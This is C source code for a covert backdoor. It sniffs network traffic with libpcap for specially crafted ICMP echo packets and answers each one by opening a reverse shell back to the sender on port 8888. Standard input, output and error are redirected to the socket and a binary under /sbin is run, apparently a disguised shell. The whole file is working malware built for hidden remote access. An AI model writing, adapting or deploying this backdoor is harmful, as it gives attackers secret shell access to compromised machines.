#include <unistd.h>
#include <netdb.h>
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

// pcap
#include <arpa/inet.h>
#include <pcap.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>

// hide syscall
#include <sys/syscall.h>

#define IP4_HDRLEN 20
#define ICMP_HDRLEN 8

#define REVERSE_SHELL_PORT 8888

void shell(int ip) {

	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1) {
		return;	// Error
	}

	else if (pid == 0)
	{
		// initialize socket descriptor, various structs for networking
		
		int sd;
		struct sockaddr_in sockaddr;
		struct in_addr sock_ip;

		// Create socket, build structs

		sd = socket(AF_INET, SOCK_STREAM,0);
		if (sd < 0) {
			return;
		}

		sock_ip.s_addr = ip;

		sockaddr.sin_family = AF_INET;
		sockaddr.sin_port = htons(REVERSE_SHELL_PORT);
		sockaddr.sin_addr = sock_ip;

		// Connect to server, duplicate stdin out and err to the socket,
		// execute a shell and block until exit. Close the socket and
		// return once the shell returns.

		int con = connect(sd, &sockaddr, sizeof(sockaddr));
		if (con < 0)
		{
			return;
		}
		dup2(sd,0);
		dup2(sd,1);
		dup2(sd,2);
		execl("/sbin/ipfctl", (char *)0);
		close(sd);
	}

	else {
		return;
	}
}

void ping_listener(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
	const u_char *ip_header;	// ptr to ip header
	int ethernet_header_len = 14;	// static length of eth header
	ip_header = packet + ethernet_header_len;
	uint32_t src_ip = 0;
	memcpy(&src_ip, (ip_header+12), 4);	// src ip is 12 bytes in to hdr
	char src_ip_string[16] = { 0 };
	shell(src_ip);
	return;
}

void cap_start(void) {
	int i;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* descr;
	const u_char *packet;
	struct pcap_pkthdr hdr;
	struct bpf_program *fp;		// Compiled filter
	bpf_u_int32 maskp;		// Subnet mask
	bpf_u_int32 netp;		// IP

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}
	
	// Lookup IP and netmask of chosen device
	pcap_lookupnet(dev, &netp, &maskp, errbuf);

	descr = pcap_open_live(dev, 65535, 0, 300, errbuf);
	if (descr == NULL) {
		printf("pcap_open_live: %s\n", errbuf);
		exit(1);
	}

	// Compile filter expression
	if (pcap_compile(descr, &fp, "icmp[icmptype] == 8 and icmp[icmpcode] == 1", 0, netp) == -1) {
		printf("Error compiling\n");
		exit(1);
	}

	if (pcap_setfilter(descr, &fp) == -1) {
		printf("Error setting\n");
		exit(1);
	}
	pcap_loop(descr, -1, ping_listener, NULL);
}

int main (int argc, char **argv) {
	while (1) { 
		cap_start(); 
	}
	return EXIT_SUCCESS;
}